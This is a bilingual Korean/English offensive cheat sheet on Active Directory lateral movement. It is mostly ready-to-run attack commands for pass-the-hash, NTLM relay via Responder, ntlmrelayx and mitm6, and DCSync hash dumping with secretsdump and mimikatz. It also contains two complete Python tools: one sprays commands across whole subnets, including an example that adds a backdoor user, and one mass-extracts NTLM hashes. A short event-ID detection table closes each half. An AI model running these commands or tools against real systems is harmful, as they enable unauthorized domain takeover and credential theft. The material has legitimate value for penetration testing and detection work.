> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# AD 횡이동 — NTLM 릴레이·DCSync·PsExec·원격 실행

## 1. 횡이동 기법 개요

| 기법 | 도구 | 필요 권한 |
|------|------|-----------|
| PsExec | psexec.py / Sysinternals | 로컬 관리자 |
| WMI | wmiexec.py | 로컬 관리자 |
| WinRM | evil-winrm | WinRM 접근 |
| DCOM | dcomexec.py | 로컬 관리자 |
| Pass-the-Hash | pth-winexe | 로컬 관리자 해시 |
| Pass-the-Ticket | Rubeus / ticketer.py | 유효한 티켓 |
| NTLM Relay | ntlmrelayx.py | 네트워크 위치 |
| DCSync | secretsdump.py | DS-Replication 권한 |

---

## 2. Pass-the-Hash (PtH)

```bash
# Impacket psexec — NTLM 해시로 원격 실행
python3 psexec.py -hashes :NTLM_HASH domain/administrator@10.10.10.100

# wmiexec — WMI 기반 (덜 시끄러움)
python3 wmiexec.py -hashes :NTLM_HASH domain/admin@10.10.10.100

# smbexec — 반대로 탐지 어려움
python3 smbexec.py -hashes :NTLM_HASH domain/admin@10.10.10.100

# evil-winrm (WinRM 5985)
evil-winrm -i 10.10.10.100 -u administrator -H NTLM_HASH

# xfreerdp (RDP PtH)
xfreerdp /v:10.10.10.100 /u:administrator /pth:NTLM_HASH /d:domain

# CrackMapExec 대량 PtH
netexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH --local-auth
```

---

## 3. NTLM Relay 공격

```bash
# 1단계: SMB 서명 비활성화 호스트 탐지
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# 2단계: Responder 설정 (SMB/HTTP 리스너 끄기)
# /etc/responder/Responder.conf 수정:
# SMB = Off
# HTTP = Off

# 3단계: ntlmrelayx 실행
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support \
  -c "powershell -enc BASE64_PAYLOAD" -l /tmp/loot

# LDAP 릴레이 → 권한 상승
python3 ntlmrelayx.py -t ldap://DC_IP -smb2support \
  --escalate-user current_user

# LDAPS 릴레이 → Shadow Credentials
python3 ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials \
  --shadow-target target_computer$

# 4단계: Responder로 NTLM 캡처 유발
python3 Responder.py -I eth0 -wf

# IPv6 기반 릴레이 (mitm6)
python3 mitm6.py -d domain.local
python3 ntlmrelayx.py -6 -t ldaps://DC_IP -wh attacker_wpad \
  --add-computer evilpc --delegate-access
```

---

## 4. DCSync 공격

DCSync는 도메인 컨트롤러 복제 권한(`DS-Replication-Get-Changes-All`)을 이용해 패스워드 해시를 원격으로 덤프한다.

```bash
# Impacket secretsdump — DCSync
python3 secretsdump.py -just-dc domain.local/admin:Password@DC_IP

# 특정 계정만 덤프
python3 secretsdump.py -just-dc-user krbtgt domain.local/admin:Password@DC_IP
python3 secretsdump.py -just-dc-user administrator domain.local/admin:Password@DC_IP

# 모든 도메인 시크릿 덤프
python3 secretsdump.py domain.local/admin:Password@DC_IP \
  -just-dc -outputfile dcsync_output

# Mimikatz DCSync (Windows)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# ACL 기반 DCSync 권한 부여 (권한 있을 때)
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
  -PrincipalIdentity attacker_user \
  -Rights DCSync
```

---

## 5. 원격 실행 자동화 CLI

```python
#!/usr/bin/env python3
"""AD 횡이동 자동화 CLI — 다중 호스트 원격 실행."""

import argparse
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from pathlib import Path
from typing import Literal
import ipaddress


@dataclass
class ExecutionResult:
    target: str
    method: str
    success: bool
    output: str
    error: str = ""


def run_wmiexec(
    target: str,
    domain: str,
    username: str,
    credential: str,
    command: str,
    use_hash: bool = False,
) -> ExecutionResult:
    hashes = f":{credential}" if use_hash else ""
    password = "" if use_hash else credential

    cmd = [
        "python3", "-m", "impacket.examples.wmiexec",
        "-hashes", hashes if use_hash else ":",
        f"{domain}/{username}:{password if not use_hash else ''}@{target}",
        command,
    ]
    if not use_hash:
        cmd = [
            "python3", "-m", "impacket.examples.wmiexec",
            f"{domain}/{username}:{credential}@{target}",
            command,
        ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        success = result.returncode == 0
        return ExecutionResult(
            target=target,
            method="wmiexec",
            success=success,
            output=result.stdout[:500],
            error=result.stderr[:200] if not success else "",
        )
    except subprocess.TimeoutExpired:
        return ExecutionResult(target=target, method="wmiexec", success=False, output="", error="Timeout")
    except Exception as e:
        return ExecutionResult(target=target, method="wmiexec", success=False, output="", error=str(e))


def spray_credentials(
    targets: list[str],
    domain: str,
    username: str,
    credential: str,
    command: str,
    use_hash: bool = False,
    max_workers: int = 10,
) -> list[ExecutionResult]:
    results: list[ExecutionResult] = []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(run_wmiexec, t, domain, username, credential, command, use_hash): t
            for t in targets
        }
        for future in as_completed(futures):
            target = futures[future]
            result = future.result()
            if result.success:
                print(f"[+] {target}: Success")
                print(f"    {result.output[:200]}")
            else:
                print(f"[-] {target}: Failed ({result.error[:100]})")
            results.append(result)

    return results


def expand_cidr(cidr: str) -> list[str]:
    """Convert CIDR notation to IP list."""
    network = ipaddress.ip_network(cidr, strict=False)
    return [str(ip) for ip in network.hosts()]


def main() -> None:
    parser = argparse.ArgumentParser(description="AD Lateral Movement Automation")
    sub = parser.add_subparsers(dest="cmd", required=True)

    spray_p = sub.add_parser("spray", help="Execute command on multiple hosts")
    spray_p.add_argument("targets", help="Target IP/CIDR or file path")
    spray_p.add_argument("domain")
    spray_p.add_argument("-u", "--user", required=True)
    spray_p.add_argument("-p", "--password", help="Password")
    spray_p.add_argument("-H", "--hash", help="NTLM hash")
    spray_p.add_argument("-c", "--command", required=True)
    spray_p.add_argument("--workers", type=int, default=10)
    spray_p.add_argument("-o", "--output", type=Path)

    args = parser.parse_args()

    if args.cmd == "spray":
        target_input = args.targets
        if Path(target_input).exists():
            targets = Path(target_input).read_text().splitlines()
        elif "/" in target_input:
            targets = expand_cidr(target_input)
        else:
            targets = [target_input]

        if not (args.password or args.hash):
            parser.error("Password (-p) or hash (-H) required")

        credential = args.hash or args.password
        use_hash = bool(args.hash)

        print(f"[*] Starting command execution on {len(targets)} hosts")
        results = spray_credentials(
            targets, args.domain, args.user, credential,
            args.command, use_hash, args.workers,
        )

        success_count = sum(1 for r in results if r.success)
        print(f"\nTotal {len(results)} / Success {success_count}")

        if args.output:
            import json
            args.output.write_text(
                json.dumps([vars(r) for r in results], indent=2, ensure_ascii=False)
            )


if __name__ == "__main__":
    main()
```

---

## 6. 자격증명 덤프 자동화

```python
#!/usr/bin/env python3
"""다중 호스트 자격증명 덤프 자동화."""

import argparse
import subprocess
import re
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field


@dataclass
class CredentialDump:
    target: str
    ntlm_hashes: list[str] = field(default_factory=list)
    cleartext_passwords: list[str] = field(default_factory=list)
    error: str = ""


NTLM_PATTERN = re.compile(r"(\w+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::")
CLEARTEXT_PATTERN = re.compile(r"(\w+):\d+:(.*?):.*?:::")


def dump_secrets(
    target: str,
    domain: str,
    username: str,
    credential: str,
    use_hash: bool = False,
) -> CredentialDump:
    hashes = f":{credential}" if use_hash else ":"
    password = "" if use_hash else credential

    cmd = [
        "python3", "-m", "impacket.examples.secretsdump",
        f"{domain}/{username}:{password}@{target}",
        "-hashes", hashes,
        "-just-dc-ntlm" if not use_hash else "-just-dc",
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        dump = CredentialDump(target=target)

        for line in result.stdout.splitlines():
            m = NTLM_PATTERN.match(line)
            if m:
                dump.ntlm_hashes.append(f"{m.group(1)}:{m.group(3)}:{m.group(4)}")

        return dump
    except Exception as e:
        return CredentialDump(target=target, error=str(e))


def main() -> None:
    parser = argparse.ArgumentParser(description="Credential Dump Automation")
    parser.add_argument("targets", help="Target file or IP")
    parser.add_argument("domain")
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-p", "--password")
    parser.add_argument("-H", "--hash")
    parser.add_argument("-o", "--output", type=Path, default=Path("/tmp/dumped_creds.txt"))
    args = parser.parse_args()

    targets = (
        Path(args.targets).read_text().splitlines()
        if Path(args.targets).exists()
        else [args.targets]
    )

    credential = args.hash or args.password or ""
    use_hash = bool(args.hash)

    all_hashes: list[str] = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {
            executor.submit(dump_secrets, t, args.domain, args.user, credential, use_hash): t
            for t in targets
        }
        for future in as_completed(futures):
            dump = future.result()
            if dump.ntlm_hashes:
                print(f"[+] {dump.target}: {len(dump.ntlm_hashes)} hashes")
                all_hashes.extend(dump.ntlm_hashes)

    if all_hashes:
        args.output.write_text("\n".join(set(all_hashes)))
        print(f"\nTotal {len(set(all_hashes))} unique hashes → {args.output}")


if __name__ == "__main__":
    main()
```

---

## 7. 탐지 우선순위

| 이벤트 ID | 의미 | 횡이동 관련성 |
|-----------|------|----------------|
| 4624 | 로그온 성공 | Type 3 (네트워크) / Type 10 (원격) |
| 4648 | 명시적 자격증명 로그온 | PtH · PtT |
| 4672 | 특권 로그온 | 관리자 권한 사용 |
| 4688 | 프로세스 생성 | psexec · wmiexec |
| 5145 | 네트워크 공유 접근 | ADMIN$·C$ 접근 |
| 4662 | AD 객체 작업 | DCSync (DS-Replication) |
| 7045 | 서비스 설치 | psexec 서비스 생성 |

---

<a name="english"></a>

# AD Lateral Movement — NTLM Relay, DCSync, PsExec, and Remote Execution

## 1. Lateral Movement Technique Overview

| Technique | Tool | Required Privilege |
|-----------|------|--------------------|
| PsExec | psexec.py / Sysinternals | Local administrator |
| WMI | wmiexec.py | Local administrator |
| WinRM | evil-winrm | WinRM access |
| DCOM | dcomexec.py | Local administrator |
| Pass-the-Hash | pth-winexe | Local admin NTLM hash |
| Pass-the-Ticket | Rubeus / ticketer.py | Valid Kerberos ticket |
| NTLM Relay | ntlmrelayx.py | Network position |
| DCSync | secretsdump.py | DS-Replication permission |

---

## 2. Pass-the-Hash (PtH)

PtH leverages the NTLM authentication protocol's design flaw: authentication uses the hash directly rather than a derived value. If an attacker captures a user's NTLM hash from memory or the SAM database, they can authenticate as that user without knowing the plaintext password.

**Tools and targets:**
- `psexec.py -hashes` — creates a service on the target for code execution (noisy, creates Event 7045)
- `wmiexec.py -hashes` — uses WMI for execution (no service creation, quieter)
- `smbexec.py -hashes` — similar to psexec but harder to detect
- `evil-winrm -H` — PowerShell remoting over WinRM port 5985
- `xfreerdp /pth` — RDP via hash (requires Restricted Admin mode)
- `netexec smb -H --local-auth` — bulk testing across an entire subnet

---

## 3. NTLM Relay Attack

NTLM relay captures NTLM authentication attempts and relays them to other targets in real-time. The four-step process:

1. **Identify targets without SMB signing** — unsigned SMB allows relay attacks
2. **Configure Responder** — disable SMB and HTTP listeners (prevent capturing, only poisoning)
3. **Run ntlmrelayx** — relay captured credentials to targets for code execution or LDAP privilege escalation
4. **Trigger NTLM auth** — use Responder to respond to LLMNR/NBT-NS queries, tricking systems into authenticating to the attacker

**Advanced variants:**
- LDAP relay → privilege escalation (add DCSync rights to attacker account)
- LDAPS relay → Shadow Credentials attack (add key credential to target)
- IPv6 relay via mitm6 → WPAD spoofing for automatic proxy configuration

---

## 4. DCSync Attack

DCSync abuses the `DS-Replication-Get-Changes-All` permission (normally held only by Domain Controllers) to pull password hashes from the domain without touching the DC locally. This simulates a legitimate DC replication request.

**Required permission:** `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (typically Domain Admins, Enterprise Admins, or Domain Controllers groups)

**Detection:** Event ID 4662 (AD object access) with `DS-Replication-Get-Changes-All` access type, originating from a non-DC IP address.

---

## 5. Remote Execution Automation CLI

The spray tool executes a command across multiple targets in parallel using wmiexec, supporting both password and NTLM hash authentication. Input can be a single IP, CIDR range, or a file containing IP addresses.

**Usage:**
```bash
# Password-based spray
python3 lateral_movement.py spray 10.10.10.0/24 corp.local \
    -u administrator -p Password123 -c "whoami" --workers 20

# Hash-based spray
python3 lateral_movement.py spray targets.txt corp.local \
    -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH \
    -c "net user hacker P@ssw0rd /add" -o results.json
```

---

## 6. Credential Dump Automation

The credential dump automation uses Impacket's `secretsdump` to extract NTLM hashes from multiple targets in parallel, deduplicates the results, and saves them to a file.

**Usage:**
```bash
python3 cred_dump.py targets.txt corp.local -u admin -H NTLM_HASH -o all_hashes.txt
```

---

## 7. Detection Priority

| Event ID | Meaning | Lateral Movement Relevance |
|----------|---------|---------------------------|
| 4624 | Logon success | Type 3 (network) / Type 10 (remote interactive) |
| 4648 | Explicit credential logon | PtH / PtT |
| 4672 | Special privilege logon | Administrator privilege use |
| 4688 | Process creation | psexec / wmiexec spawning |
| 5145 | Network share access | ADMIN$, C$ access |
| 4662 | AD object operation | DCSync (DS-Replication) |
| 7045 | Service installation | psexec service creation |
